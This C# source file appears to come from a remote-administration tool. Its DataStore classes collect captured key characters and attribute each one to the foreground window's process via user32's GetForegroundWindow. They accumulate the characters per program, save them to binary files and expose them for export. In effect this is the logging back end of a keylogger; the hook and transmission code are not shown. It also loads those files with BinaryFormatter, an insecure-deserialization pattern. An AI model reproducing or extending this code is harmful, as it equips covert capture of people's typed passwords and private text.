using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;

namespace JPB.RemoteAdmin.Common.Manage
{
    public class DataStore : IDisposable
    {
        public readonly ProcessModel DefaultProcess;
        internal const string PathToExportDir = "KeyDataStore2.bin";
        public DataStore()
        {
            DefaultProcess = ProcessModel.CreateDefaultProcess();
            ProcessModels = new List<ProcessModel>();
            if (File.Exists(PathToExportDir))
                using (var memst = new FileStream(PathToExportDir, FileMode.OpenOrCreate, FileAccess.ReadWrite))
                {
                    BinaryFormatter binaryFormatter = new BinaryFormatter();
                    try
                    {
                        ProcessModels = (List<ProcessModel>)binaryFormatter.Deserialize(memst);
                    }
                    catch (Exception)
                    {
                        throw;
                    }
                }

        }

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        public void Add(char key)
        {
            var currentProcess = GetCurrentProcess();
            currentProcess.AppendChar(key);
        }

        public List<ProcessModel> ProcessModels { get; set; }

        private ProcessModel GetCurrentProcess()
        {
            var processCollection = Process.GetProcesses();
            var activeWindowHandle = GetForegroundWindow();
            foreach (Process proc in processCollection)
            {
                if (proc.MainWindowHandle == activeWindowHandle)
                {
                    var fod = ProcessModels.FirstOrDefault(s => s.LocalInfos.ProcessName == proc.ProcessName);
                    if (fod == null)
                    {
                        fod = new ProcessModel(proc);
                        ProcessModels.Add(fod);
                        return fod;
                    }
                    else
                    {
                        return fod;
                    }
                }
            }
            return DefaultProcess;
        }

        public ProcessModelExport[] GetCurrentState()
        {
            return ProcessModels
                .Concat(new[] { DefaultProcess })
                .Select(s => s.Serilize())
                .AsParallel()
                .ToArray();
        }

        public void Dispose()
        {
            if (Disposing)
                return;

            Disposing = true;

            using (var memst = new FileStream(PathToExportDir, FileMode.OpenOrCreate, FileAccess.ReadWrite))
            {
                BinaryFormatter binaryFormatter = new BinaryFormatter();
                binaryFormatter.Serialize(memst, ProcessModels);
            }
        }
        public bool Disposing { get; private set; }

        ~DataStore()
        {
            Dispose();
        }
    }

    public class ReadOnlyDataStore : IDisposable
    {
        internal const string PathToExportDir = "KeyDataStore.bin";
        public ReadOnlyDataStore()
        {
            ProcessModels = new List<ProcessModelExport>();
            if (File.Exists(PathToExportDir))
                using (var memst = new FileStream(PathToExportDir, FileMode.OpenOrCreate, FileAccess.ReadWrite))
                {
                    BinaryFormatter binaryFormatter = new BinaryFormatter();
                    ProcessModels = (List<ProcessModelExport>)binaryFormatter.Deserialize(memst);
                }
        }

        public List<ProcessModelExport> ProcessModels { get; set; }

        public bool Disposing { get; private set; }

        public void AppentModels(IEnumerable<ProcessModelExport> toAppend)
        {
            foreach (var item in toAppend)
            {
                var fod = ProcessModels.FirstOrDefault(s => s.ProcessName == item.ProcessName);
                if (fod != null)
                {
                    fod.Export += item.Export;
                }
                else
                {
                    ProcessModels.Add(item);
                }
            }
        }

        public void Dispose()
        {
            if (Disposing)
                return;

            Disposing = true;

            using (var memst = new FileStream(PathToExportDir, FileMode.OpenOrCreate, FileAccess.ReadWrite))
            {
                BinaryFormatter binaryFormatter = new BinaryFormatter();
                binaryFormatter.Serialize(memst, ProcessModels);
            }
        }

        ~ReadOnlyDataStore()
        {
            Dispose();
        }
    }

    [Serializable]
    public class ProcessModel
    {
        public ProcessModel()
        {
            _locker = new object();
        }

        //[NonSerialized]
        //FileStream tempFile;

        public ProcessModel(Process proc)
            : this()
        {
            LocalInfos = new LocalInfo();
            LocalInfos.ProcessName = proc.ProcessName;
            LocalInfos.StoreLocation = Path.GetTempFileName();
            //tempFile = new FileStream(LocalInfos.StoreLocation, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.Delete);

        }

        [NonSerialized]
        private readonly object _locker;

        public string ExportedChar = string.Empty;

        public void AppendChar(char character)
        {
            lock (_locker)
            {
                ExportedChar += character.ToString();
            }
        }

        public ProcessModelExport Serilize()
        {
            lock (_locker)
            {
                var processModelExport = new ProcessModelExport();
                processModelExport.ProcessName = LocalInfos.ProcessName;
                processModelExport.Export = ExportedChar;
                ExportedChar = string.Empty;
                return processModelExport;
            }
        }

        public LocalInfo LocalInfos { get; set; }

        internal static ProcessModel CreateDefaultProcess()
        {
            return new ProcessModel()
            {
                LocalInfos = new LocalInfo()
                    {
                        ProcessName = "N/A",
                        StoreLocation = Path.GetTempFileName()
                    }
            };
        }
    }

    [Serializable]
    public class ProcessModelExport
    {
        public string Export { get; set; }
        public string ProcessName { get; set; }
    }
}
